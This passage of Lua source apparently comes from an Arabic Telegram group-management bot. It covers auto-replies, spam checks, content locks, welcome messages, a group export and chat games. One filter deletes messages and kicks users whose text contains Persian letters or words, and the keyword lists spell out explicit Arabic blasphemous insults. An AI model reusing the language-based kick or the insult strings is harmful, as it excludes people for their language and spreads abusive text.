sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, DevRio:get(Carlin..'Rio:Photo:GpRed'..msg.content_.text_..msg.chat_id_)) 
end
if DevRio:get(Carlin..'Rio:Gif:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, DevRio:get(Carlin..'Rio:Gif:GpRed'..msg.content_.text_..msg.chat_id_)) 
end 
if DevRio:get(Carlin..'Rio:Stecker:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, DevRio:get(Carlin..'Rio:Stecker:GpRed'..msg.content_.text_..msg.chat_id_))
end
if DevRio:get(Carlin..'Rio:Text:GpRed'..msg.content_.text_..msg.chat_id_) then
function CarlinTeam(extra,result,success)
if result.username_ then username = '[@'..result.username_..']' else username = 'لا يوجد' end
local edit_msg = DevRio:get(Carlin..'Rio:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevRio:get(Carlin..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = DevRio:get(Carlin..'Rio:Text:GpRed'..msg.content_.text_..msg.chat_id_)
...
getUser(msg.sender_user_id_, CarlinTeam)
end
end
--     Source Carlin     --
text = msg.content_.text_
if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then
local SaveAllRed = DevRio:get(Carlin.."Rio:Add:AllRed"..msg.sender_user_id_)
if SaveAllRed == 'SaveAllRed' then
if text == 'الغاء' then
local DelSudoRep = DevRio:get(Carlin..'DelSudoRep')
DevRio:del(Carlin.."Rio:Sudo:AllRed",DelSudoRep)
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ الرد', 1, 'md')
DevRio:del(Carlin.."Rio:Add:AllText"..msg.sender_user_id_)
DevRio:del(Carlin.."Rio:Add:AllRed"..msg.sender_user_id_)
DevRio:del(Carlin.."DelSudoRep")
return false
end
DevRio:del(Carlin.."Rio:Add:AllRed"..msg.sender_user_id_)
local SaveAllRed = DevRio:get(Carlin.."Rio:Add:AllText"..msg.sender_user_id_)
if msg.content_.video_ then
DevRio:set(Carlin.."Rio:Video:AllRed"..SaveAllRed, msg.content_.video_.video_.persistent_id_)
end
if msg.content_.document_ then
DevRio:set(Carlin.."Rio:File:AllRed"..SaveAllRed, msg.content_.document_.document_.persistent_id_)
end
if msg.content_.sticker_ then
DevRio:set(Carlin.."Rio:Stecker:AllRed"..SaveAllRed, msg.content_.sticker_.sticker_.persistent_id_)
end
if msg.content_.voice_ then
DevRio:set(Carlin.."Rio:Voice:AllRed"..SaveAllRed, msg.content_.voice_.voice_.persistent_id_)
end
if msg.content_.audio_ then
DevRio:set(Carlin.."Rio:Audio:AllRed"..SaveAllRed, msg.content_.audio_.audio_.persistent_id_)
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
...
DevRio:set(Carlin.."Rio:Photo:AllRed"..SaveAllRed, photo_in_all_groups)
end
if msg.content_.animation_ then
DevRio:set(Carlin.."Rio:Gif:AllRed"..SaveAllRed, msg.content_.animation_.animation_.persistent_id_)
end
if msg.content_.text_ then
DevRio:set(Carlin.."Rio:Text:AllRed"..SaveAllRed, msg.content_.text_)
end 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم حفظ الرد الجديد', 1, 'md') 
DevRio:del(Carlin.."Rio:Add:AllText"..msg.sender_user_id_)
DevRio:del(Carlin..'DelSudoRep')
return false end end
if msg.content_.text_ and not DevRio:get(Carlin..'Rio:Lock:AllRed'..msg.chat_id_) then
if DevRio:get(Carlin.."Rio:Video:AllRed"..msg.content_.text_) then
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevRio:get(Carlin.."Rio:Video:AllRed"..msg.content_.text_))
end
if DevRio:get(Carlin.."Rio:File:AllRed"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, DevRio:get(Carlin.."Rio:File:AllRed"..msg.content_.text_))
end
if DevRio:get(Carlin.."Rio:Voice:AllRed"..msg.content_.text_)  then
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevRio:get(Carlin.."Rio:Voice:AllRed"..msg.content_.text_))
end
if DevRio:get(Carlin.."Rio:Audio:AllRed"..msg.content_.text_)  then
sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, DevRio:get(Carlin.."Rio:Audio:AllRed"..msg.content_.text_))
end
if DevRio:get(Carlin.."Rio:Photo:AllRed"..msg.content_.text_)  then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, DevRio:get(Carlin.."Rio:Photo:AllRed"..msg.content_.text_))
end
if  DevRio:get(Carlin.."Rio:Gif:AllRed"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, DevRio:get(Carlin.."Rio:Gif:AllRed"..msg.content_.text_))
end
if DevRio:get(Carlin.."Rio:Stecker:AllRed"..msg.content_.text_) then
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, DevRio:get(Carlin.."Rio:Stecker:AllRed"..msg.content_.text_))
end
if DevRio:get(Carlin.."Rio:Text:AllRed"..msg.content_.text_) then
function CarlinTeam(extra,result,success)
if result.username_ then username = '[@'..result.username_..']' else username = 'لا يوجد' end
local edit_msg = DevRio:get(Carlin..'Rio:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevRio:get(Carlin..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = DevRio:get(Carlin.."Rio:Text:AllRed"..msg.content_.text_)
local Text = Text:gsub('#username',(username or 'لا يوجد')) 
local Text = Text:gsub('#name','['..result.first_name_..']')
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',edit_msg)
...
if Type == "keed" and not DevRio:sismember(Carlin..'Rio:Tkeed:'..msg.chat_id_, msg.sender_user_id_) then
...
if Type == "mute" and not DevRio:sismember(Carlin..'Rio:Muted:'..msg.chat_id_, msg.sender_user_id_) then
DevRio:sadd(Carlin..'Rio:Muted:'..msg.chat_id_,msg.sender_user_id_)
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
...
--  end functions Carlin --
--     Source Carlin     --
--       Spam Check       --
if not VipMem(msg) and msg.content_.ID ~= "MessageChatAddMembers" and DevRio:hget(Carlin.."Rio:Spam:Group:User"..msg.chat_id_,"Spam:User") then 
if msg.sender_user_id_ ~= Carlin then
floods = DevRio:hget(Carlin.."Rio:Spam:Group:User"..msg.chat_id_,"Spam:User") or "nil"
Num_Msg_Max = DevRio:hget(Carlin.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
Time_Spam = DevRio:hget(Carlin.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 5
local post_count = tonumber(DevRio:get(Carlin.."Rio:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_) or 0)
if post_count > tonumber(DevRio:hget(Carlin.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5) then 
local ch = msg.chat_id_
local type = DevRio:hget(Carlin.."Rio:Spam:Group:User"..msg.chat_id_,"Spam:User") 
NotSpam(msg,type)  
end
DevRio:setex(Carlin.."Rio:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_, tonumber(DevRio:hget(Carlin.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 3), post_count+1) 
local edit_id = data.text_ or "nil"  
Num_Msg_Max = 5
if DevRio:hget(Carlin.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam") then
Num_Msg_Max = DevRio:hget(Carlin.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam") 
end
if DevRio:hget(Carlin.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") then
Time_Spam = DevRio:hget(Carlin.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") 
end 
end
end 
--     Source Carlin     --
...
if Constructor(msg) or tonumber(msg.sender_user_id_) == tonumber(Carlin) then
DevRio:set(Carlin..'Rio:PinnedMsg'..msg.chat_id_,msg.content_.message_id_)
else
local pin_id = DevRio:get(Carlin..'Rio:PinnedMsg'..msg.chat_id_)
if pin_id and DevRio:get(Carlin..'Rio:Lock:Pin'..msg.chat_id_) then
pinmsg(msg.chat_id_,pin_id,0)
end
end
end
if DevRio:get(Carlin..'Rio:viewget'..msg.sender_user_id_) then
if not msg.forward_info_ then
DevRio:del(Carlin..'Rio:viewget'..msg.sender_user_id_)
else
...
if DevRio:get(Carlin..'Rio:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevRio:get(Carlin..'Rio:Lock:Photo'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevRio:get(Carlin..'Rio:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevRio:get(Carlin..'Rio:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevRio:get(Carlin..'Rio:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevRio:get(Carlin..'Rio:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevRio:get(Carlin..'Rio:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevRio:get(Carlin..'Rio:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
...
if DevRio:get(Carlin..'Rio:Lock:Markdown'..msg.chat_id_) then
if not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
...
if DevRio:get(Carlin..'Rio:Lock:Document'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
...
if not VipMem(msg) then
if DevRio:get(Carlin..'Rio:Lock:Inline'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
--     Source Carlin     --
...
elseif msg.content_.ID == "MessageSticker" then
if not VipMem(msg) then
if DevRio:get(Carlin..'Rio:Lock:Stickers'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
...
if DevRio:get(Carlin..'Rio:Groups:Welcomes'..msg.chat_id_) then
Welcomes = DevRio:get(Carlin..'Rio:Groups:Welcomes'..msg.chat_id_)
else
Welcomes = '• نورت حبي \n• firstname \n• username'
end
...
if DevRio:get(Carlin.."Rio:Lock:Welcome"..msg.chat_id_) then
getUser(msg.sender_user_id_,get_welcome)
end
--     Source Carlin     --
--      New User Add      --
elseif msg.content_.ID == "MessageChatAddMembers" then
if not DevRio:get(Carlin..'Rio:Lock:BotWelcome') then 
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = Carlin,offset_ = 0,limit_ = 1},function(extra,rio,success) 
for i=0,#msg.content_.members_ do    
BotWelcome = msg.content_.members_[i].id_    
if BotWelcome and BotWelcome == tonumber(Carlin) then 
if DevRio:sismember(Carlin..'Rio:Groups',msg.chat_id_) then BotText = "مفعله في السابق\n᥀︙ارسل ↫ الاوامر واستمتع بالمميزيات" else BotText = "معطله يجب رفعي مشرف\n᥀︙بعد ذلك يرجى ارسال امر ↫ تفعيل\n᥀︙سيتم رفع الادمنيه والمنشئ تلقائيا" end 
if DevRio:get(Carlin.."Rio:Text:BotWelcome") then RioText = DevRio:get(Carlin.."Rio:Text:BotWelcome") else RioText = "᥀︙مرحبا انا بوت اسمي "..NameBot.."\n᥀︙حالة المجموعه ↫ "..BotText.."\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉" end 
if DevRio:get(Carlin.."Rio:Photo:BotWelcome") then RioPhoto = DevRio:get(Carlin.."Rio:Photo:BotWelcome") elseif rio.photos_[0] then RioPhoto = rio.photos_[0].sizes_[1].photo_.persistent_id_ else RioPhoto = nil end 
...
if DevRio:get(Carlin..'Rio:Lock:Contact'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
--     Source Carlin     --
...
if DevRio:get(Carlin..'Rio:Lock:Music'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
...
if DevRio:get(Carlin..'Rio:Lock:Voice'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
...
if DevRio:get(Carlin..'Rio:Lock:Location'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return
end
if msg.content_.caption_ then
...
if DevRio:get(Carlin..'Rio:Lock:Videos'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
...
if DevRio:get(Carlin..'Rio:Lock:Gifs'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
...
if DevRio:get(Carlin..'Rio:Lock:Text'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
...
if not DevRio:get(Carlin..'Rio:Spam:Text'..msg.chat_id_) then
sens = 400
else
sens = tonumber(DevRio:get(Carlin..'Rio:Spam:Text'..msg.chat_id_))
end
if DevRio:get(Carlin..'Rio:Lock:Spam'..msg.chat_id_) and string.len(msg.content_.text_) > (sens) or ctrl_chars > (sens) or real_digits > (sens) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
...
--     Source Carlin     --
if DevRio:get(Carlin.."Rio:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_) then
if text == "الغاء" then
send(msg.chat_id_,msg.id_,"᥀︙تم الغاء حفظ الرابط")       
DevRio:del(Carlin.."Rio:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_) 
return false
end
if msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)") then
local Link = msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)")
DevRio:set(Carlin.."Rio:Groups:Links"..msg.chat_id_,Link)
...
if DevRio:get('CarlinTeam:'..Carlin.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
DevRio:del('CarlinTeam:'..Carlin..'id:user'..msg.chat_id_)  
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء الامر', 1, 'md')
DevRio:del('CarlinTeam:'..Carlin.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
return false  end 
DevRio:del('CarlinTeam:'..Carlin.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = DevRio:get('CarlinTeam:'..Carlin..'id:user'..msg.chat_id_)  
DevRio:incrby(Carlin..'Rio:UsersMsgs'..msg.chat_id_..':'..iduserr,numadded)
Dev_Rio(msg.chat_id_, msg.id_,  1, "᥀︙تم اضافة "..numadded..' رساله', 1, 'md')
DevRio:del('CarlinTeam:'..Carlin..'id:user'..msg.chat_id_) 
end
end
if text and Constructor(msg) then 
if DevRio:get('CarlinTeam:'..Carlin.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
DevRio:del('CarlinTeam:'..Carlin..'ids:user'..msg.chat_id_)  
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء الامر', 1, 'md')
DevRio:del('CarlinTeam:'..Carlin.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
return false  end 
DevRio:del('CarlinTeam:'..Carlin.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = DevRio:get('CarlinTeam:'..Carlin..'ids:user'..msg.chat_id_)  
DevRio:incrby(Carlin..'Rio:GamesNumber'..msg.chat_id_..iduserr,numadded)  
...
if not DevRio:get(Carlin.."Rio:Lock:Fshar"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
...
if DevRio:get(Carlin.."Rio:Lock:Farsi"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","᥀︙ممنوع التكلم بالغه الفارسيه هنا")  
end end
if text and (text:match("ڬ") or text:match("ٺ") or text:match("چ") or text:match("ڇ") or text:match("ڿ") or text:match("ڀ") or text:match("ڎ") or text:match("ݫ") or text:match("ژ") or text:match("ڟ") or text:match("ݜ") or text:match("ڸ") or text:match("پ") or text:match("۴") or text:match("مک") or text:match("زدن") or text:match("دخترا") or text:match("دیوث") or text:match("کلیپشن") or text:match("خوششون") or text:match("میدا") or text:match("که") or text:match("بدانیم") or text:match("باید") or text:match("زناشویی") or text:match("آموزش") or text:match("راحتی") or text:match("خسته") or text:match("بیام") or text:match("بپوشم") or text:match("كرمه")) then
if DevRio:get(Carlin.."Rio:Lock:FarsiBan"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ChatKick(msg.chat_id_, msg.sender_user_id_)
end end 
if text and (text:match("خره بالله") or text:match("خبربك") or text:match("كسدينربك") or text:match("خرب بالله") or text:match("خرب الله") or text:match("خره بربك") or text:match("الله الكواد") or text:match("خره بمحمد") or text:match("كسم الله") or text:match("كسم ربك") or text:match("كسربك") or text:match("كسختالله") or text:match("كسخت الله") or text:match("خره بدينك") or text:match("خرهبدينك") or text:match("كسالله") or text:match("خربالله")) then
if not DevRio:get(Carlin.."Rio:Lock:Kfr"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
...
if not DevRio:get(Carlin.."Rio:Lock:Taf"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
...
local List = DevRio:smembers(Carlin..'Rio:Groups') 
local BotName = (DevRio:get(Carlin.."Rio:NameBot") or 'Carlin')
local GetJson = '{"BotId": '..Carlin..',"BotName": "'..BotName..'","GroupsList":{'  
for k,v in pairs(List) do 
LinkGroups = DevRio:get(Carlin.."Rio:Groups:Links"..v)
Welcomes = DevRio:get(Carlin..'Rio:Groups:Welcomes'..v) or ''
Welcomes = Welcomes:gsub('"',"") Welcomes = Welcomes:gsub("'","") Welcomes = Welcomes:gsub(",","") Welcomes = Welcomes:gsub("*","") Welcomes = Welcomes:gsub(";","") Welcomes = Welcomes:gsub("`","") Welcomes = Welcomes:gsub("{","") Welcomes = Welcomes:gsub("}","") 
RioConstructors = DevRio:smembers(Carlin..'Rio:RioConstructor:'..v)
Constructors = DevRio:smembers(Carlin..'Rio:BasicConstructor:'..v)
BasicConstructors = DevRio:smembers(Carlin..'Rio:Constructor:'..v)
Managers = DevRio:smembers(Carlin..'Rio:Managers:'..v)
Admis = DevRio:smembers(Carlin..'Rio:Admins:'..v)
Vips = DevRio:smembers(Carlin..'Rio:VipMem:'..v)
if k == 1 then
GetJson = GetJson..'"'..v..'":{'
else
GetJson = GetJson..',"'..v..'":{'
...
GetJson = GetJson..'}}'
local File = io.open('./'..Carlin..'.json', "w")
File:write(GetJson)
File:close()
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './'..Carlin..'.json', '᥀︙يحتوي الملف على ↫ '..#List..' مجموعه',dl_cb, nil)
io.popen('rm -rf ./'..Carlin..'.json')
end
...
--     Source Carlin     --
if DevRio:get(Carlin.."SET:GAME"..msg.chat_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 6 then
Dev_Rio( msg.chat_id_, msg.id_, 1,"᥀︙يوجد فقط ( 6 ) اختيارات\n᥀︙ارسل اختيارك مره اخرى", 1, "md")    
return false  end 
local GETNUM = DevRio:get(Carlin.."GAMES"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
DevRio:del(Carlin.."SET:GAME"..msg.chat_id_)   
Dev_Rio( msg.chat_id_, msg.id_, 1,'᥀︙*المحيبس باليد رقم* ↫ '..NUM..'\n᥀︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*', 1, "md") 
DevRio:incrby(Carlin..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_,5)  
...
if DevRio:get(Carlin..'DevRio4'..msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_, "᥀︙تم الغاء الامر")
DevRio:del(Carlin..'DevRio4'..msg.sender_user_id_)
return false  end 
DevRio:del(Carlin..'DevRio4'..msg.sender_user_id_)
...
DevRio:set(Carlin..'Rio:ChId',data.id_)
else
...
--     Source Carlin     --
if DevRio:get(Carlin.."Rio:DevText"..msg.chat_id_..":" .. msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
DevRio:del(Carlin.."Rio:DevText"..msg.chat_id_..":" .. msg.sender_user_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء الامر', 1, 'md')
return false 
end 
DevRio:del(Carlin.."Rio:DevText"..msg.chat_id_..":" .. msg.sender_user_id_)
local DevText = msg.content_.text_:match("(.*)")
DevRio:set(Carlin.."DevText", DevText)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ كليشة المطور", 1, "md")
end
if DevRio:get(Carlin..'Rio:NameBot'..msg.sender_user_id_) == 'msg' then
if text and text:match("^الغاء$") then 
DevRio:del(Carlin..'Rio:NameBot'..msg.sender_user_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء الامر', 1, 'md')
return false 
end 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم حفظ اسم البوت ', 1, 'html')
DevRio:del(Carlin..'Rio:NameBot'..msg.sender_user_id_)
DevRio:set(Carlin..'Rio:NameBot', text)
return false 
end
--     Source Carlin     --
if text == "الرابط" then
if not DevRio:get(Carlin..'Rio:Lock:GpLinks'..msg.chat_id_) then 
if DevRio:get(Carlin.."Rio:Groups:Links"..msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙Group Link ↬ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"..DevRio:get(Carlin.."Rio:Groups:Links"..msg.chat_id_), 1, "html")
else 
...
--     Source Carlin     --
if text == "الرابط" then
if not DevRio:get(Carlin.."Rio:Lock:GpLinksinline"..msg.chat_id_) then 
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,ta) 
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_)) or DevRio:get(Carlin.."Private:Group:Link"..msg.chat_id_) 
...
NameBot = (DevRio:get(Carlin..'Rio:NameBot') or 'Carlin')
local CarlinTeam = {' كول حبيبي ؟ اني '..NameBot..' ',' وياك القميل '..NameBot..' ',' اسمي القميل '..NameBot..' '}
DevRio2 = math.random(#CarlinTeam) 
Dev_Rio(msg.chat_id_, msg.id_, 1, CarlinTeam[DevRio2] , 1, 'html') 
return false
end
if text == 'اسم البوت' or text == 'البوت شنو اسمه' or text == 'شسمه البوت' or text == 'البوت شسمه' then
NameBot = (DevRio:get(Carlin..'Rio:NameBot') or 'Carlin') 
local CarlinTeam = {"اسمي القميل "..NameBot.." "} 
DevRio2 = math.random(#CarlinTeam) 
Dev_Rio(msg.chat_id_, msg.id_, 1, CarlinTeam[DevRio2] , 1, 'html') 
return false
end
if text and text == (DevRio:get(Carlin..'Rio:NameBot') or 'Carlin') then 
NameBot = (DevRio:get(Carlin..'Rio:NameBot') or 'Carlin')
...
if tonumber((DevRio:get(Carlin..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙لم تربح اي نقطه\n᥀︙ارسل ↫ الالعاب للعب', 1, 'md')
else 
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙عدد النقاط التي ربحتها ↫ '..(DevRio:get(Carlin..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_)), 1, 'md')
end
end
if text ==  'حذف رسائلي' and ChCheck(msg) or text ==  'مسح رسائلي' and ChCheck(msg) then DevRio:del(Carlin..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_) Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم حذف جميع رسائلك', 1, 'md') end
if text ==  'حذف نقاطي' and ChCheck(msg) or text ==  'مسح نقاطي' and ChCheck(msg) then DevRio:del(Carlin..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_) Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم حذف جميع نقاطك', 1, 'md') end
--     Source Carlin     --
if text == 'سمايلات' and ChCheck(msg) or text == 'السمايلات' and ChCheck(msg) or text == '↫ سمايلات ᥀' and ChCheck(msg) then
if not DevRio:get(Carlin..'Rio:Lock:Games'..msg.chat_id_) then
DevRio2 = {'🍏','🍎','🍐','🍊','🍋','🍌','🍉','🍇','🍓','🍈','🍒','🍑','🍍','🥥','🥝','🍅','🍆','🥑','🥦','🥒','🌶','🌽','🥕','🥔','🍠','🥐','🍞','🥖','🥨','🧀','🥚','🍳','🥞','🥓','🥩','🍗','🍖','🌭','🍔','🍟','🍕','🥪','🥙','🍼','☕️','🍵','🥤','🍶','🍺','🍻','🏀','⚽️','🏈','⚾️','🎾','🏐','🏉','🎱','🏓','🏸','🥅','🎰','🎮','🎳','🎯','🏆','🎻','🎸','🎺','🥁','🎹','🎼','🎧','🎤','🎬','🎨','🎭','🎪','🛎','📤','🎗','🏵','🎖','🏆','🥌','🛷','🚕','🚗','🚙','🚌','🚎','🏎','🚓','🚑','🚚','🚛','🚜','🇮🇶','⚔️','🛡','🔮','🌡','💣','⏱','🛢','📓','📗','📂','📅','📪','📫','📬','📭','⏰','📺','🎚','☎️','📡'}
name = DevRio2[math.random(#DevRio2)]
DevRio:set(Carlin..'Rio:GameNum'..msg.chat_id_,name)
DevRio:del(Carlin..'Rio:Games:Ids'..msg.chat_id_)
...
name = string.gsub(name,'🎚','🎚')
name = string.gsub(name,'☎️','☎️')
CarlinTeam = '᥀︙اول واحد يدز هذا السمايل يربح ↫ '..name
Dev_Rio(msg.chat_id_, msg.id_, 1,CarlinTeam, 1, 'md')
return false
end end
if text == DevRio:get(Carlin..'Rio:GameNum'..msg.chat_id_) and not DevRio:get(Carlin..'Rio:Games:Ids'..msg.chat_id_) then
if not DevRio:get(Carlin..'Rio:Games:Ids'..msg.chat_id_) then 
CarlinTeam = '᥀︙مبروك لقد ربحت في اللعبه \n᥀︙ارسل ↫ سمايلات للعب مره اخرى'
Dev_Rio(msg.chat_id_, msg.id_, 1,CarlinTeam, 1, 'md')
DevRio:incrby(Carlin..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevRio:set(Carlin..'Rio:Games:Ids'..msg.chat_id_,true)
end
...
CarlinTeam = '᥀︙اول واحد يرتبها يربح ↫ '..name
Dev_Rio(msg.chat_id_, msg.id_, 1,CarlinTeam, 1, 'md')
return false
end end
if text == DevRio:get(Carlin..'Rio:GameNum'..msg.chat_id_) and not DevRio:get(Carlin..'Rio:Games:Ids'..msg.chat_id_) then
...
if not DevRio:get(Carlin..'Rio:Lock:Games'..msg.chat_id_) then
Num = math.random(1,6)
DevRio:set(Carlin.."GAMES"..msg.chat_id_,Num) 
TEST = [[
➀     ➁     ➂     ➃     ➄     ➅
↓     ↓     ↓     ↓     ↓     ↓
👊 ‹› 👊🏻 ‹› 👊🏼 ‹› 👊🏽 ‹› 👊🏾 ‹› 👊🏿
...
DevRio:setex(Carlin.."SET:GAME"..msg.chat_id_, 100, true)  
return false  
end end
...
CarlinTeam = '᥀︙اول واحد يحلها يربح ↫ '..name
